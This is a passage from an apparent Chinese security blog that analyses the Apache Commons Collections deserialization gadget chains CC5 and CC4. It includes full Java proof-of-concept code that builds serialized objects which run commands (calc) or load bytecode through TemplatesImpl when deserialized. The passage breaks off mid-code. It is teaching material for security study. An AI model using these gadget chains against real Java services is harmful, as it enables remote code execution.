<p>可以看到会调用<strong>get</strong>函数获取<strong>val</strong>对象，然后赋给<strong>valObj</strong>，符合判断后调用该对象的**toString()**方法</p>
<p>这时，我们可以去看一下<strong>TiedMapRntry</strong>类的**toString()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到里面调用了**getValue()**方法，在跟进一下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>到这里后面的利用就清楚了，也就是<strong>CC6</strong>这条链换了个入口类</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入口类</span></span><br><span class="line"><span class="comment"> * BadAttributeValueExpException类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">chainedTransformerClassField</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">chainedTransformerClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">chainedTransformerClassField.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">serialize(BadAttributeValueExpException对象);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p>创建<strong>BadAttributeValueExpException</strong>对象，并利用反射将<strong>Val</strong>对象改为构造好的<strong>tiedMapEntry</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">BadAttributeValueExpException</span>&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">badAttributeValueExpExceptionClassDeclaredField</span> <span class="operator">=</span> badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">badAttributeValueExpExceptionClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">badAttributeValueExpExceptionClassDeclaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure></div>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入口类</span></span><br><span class="line"><span class="comment"> * BadAttributeValueExpException类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">BadAttributeValueExpException</span>&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">badAttributeValueExpExceptionClassDeclaredField</span> <span class="operator">=</span> badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">badAttributeValueExpExceptionClassDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">badAttributeValueExpExceptionClassDeclaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">chainedTransformerClassField</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">chainedTransformerClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">chainedTransformerClassField.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">serialize(BadAttributeValueExpException对象);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections5</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections4</title>
    <url>/2023/09/18/Java%E5%AE%89%E5%85%A8/CommonsCollection4%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两 个分⽀版本： </p>
<ul>
<li><p>commons-collections:commons-collections </p>
</li>
<li><p>org.apache.commons:commons-collections4</p>
</li>
</ul>
<p>可⻅，groupId和artifactId都变了。前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>不过说到底还是利用<strong>Transform</strong>类对象的<strong>transform()<strong>方法直接执行代码，或者是利用</strong>TemplatesImpl</strong>类实现类加载执行任意代码</p>
<h1 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h1><ul>
<li>CommonsCollections 4.0</li>
<li>JDK暂无限制</li>
</ul>
<h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><p>首先，还是去找在哪个地方调用了**transform()**方法，这里可以看到找到的是</p>
<p><strong>TransformingComparator</strong>类下的**compare()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看到，在<strong>compare()<strong>方法中，调用了传入</strong>transformer</strong>对象的**transformer()**方法</p>
<p>现在就是可以去找哪里调用了**compare()<strong>方法，最好是直接重写了</strong>readObject()<strong>，并且可以直接走到</strong>compare()**方法</p>
<p>这边可能得对<strong>Java</strong>比较熟悉才好找</p>
<p>这边直接看利用链给的是<strong>java.util.PriorityQueue</strong>这个类，是一个<strong>优先队列</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，在**readObject()<strong>的最后调用了</strong>heapify()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>紧接着在**heapify()<strong>中又调用了</strong>siftDown()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而在**siftDown()<strong>方法中又调用了</strong>siftDownUsingComparator()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在<strong>siftDownUsingComparator()<strong>方法中，调用了</strong>comparator</strong>对象的**compare()**方法，</p>
<p>而且往上翻可以发现，<strong>comparator</strong>对象可以在<strong>PriorityQueue</strong>类初始化对象的时候传进去</p>
<p>而且<strong>TransformingComparator</strong>类也实现了<strong>Comparator</strong>和<strong>Serializable</strong>接口</p>
<p><strong>注：</strong></p>
<p>旧的<strong>Commons-Collections</strong>包中的<strong>TransformingComparator</strong>类中并没有实现<strong>Serializable</strong>接口，所以无法利用</p>
<h2 id="当前的利用链"><a href="#当前的利用链" class="headerlink" title="当前的利用链"></a>当前的利用链</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">		PriorityQueue.siftDown()</span><br><span class="line">			PriorityQueue.siftDownUsingComparator()</span><br><span class="line">				TransformingComparator.compare()</span><br><span class="line">					Transformer.transform()</span><br></pre></td></tr></table></figure></div>

<h2 id="TemplateImpl执行代码"><a href="#TemplateImpl执行代码" class="headerlink" title="TemplateImpl执行代码"></a>TemplateImpl执行代码</h2><p>执行代码部分就是<strong>CC1</strong>或<strong>CC3</strong>的写法了，以<strong>CC3</strong>为例</p>
<p>构造<strong>TemplateImpl</strong>类执行代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br></pre></td></tr></table></figure></div>

<p>这边就可以开始构造<strong>CC4</strong>了</p>
<h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>创建⼀个 <strong>TransformingComparator</strong> ，传⼊我们的<strong>Transformer</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>实例化 <strong>PriorityQueue</strong> 对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure></div>

<p>然后序列化、反序列化<strong>PriorityQueue</strong>对象，POC如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>运行后会发现并没有执行出我们想要的结果</p>
<p>在<strong>readObject</strong>中的<strong>heapify()<strong>打个断点，可以发现</strong>heapify()<strong>方法中的</strong>for</strong>循环里</p>
<p><strong>size</strong>的大小为<strong>0</strong>，所以右移三位后还是为<strong>0</strong></p>
<p>只有当<strong>size &gt;&#x3D; 2</strong>的时候，右移才会**&gt;&#x3D; 1**，条件才能成立</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br></pre></td></tr></table></figure></div>

<p>所以可以给<strong>PriorityQueue</strong>对象添加两个参数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>

<p>即</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 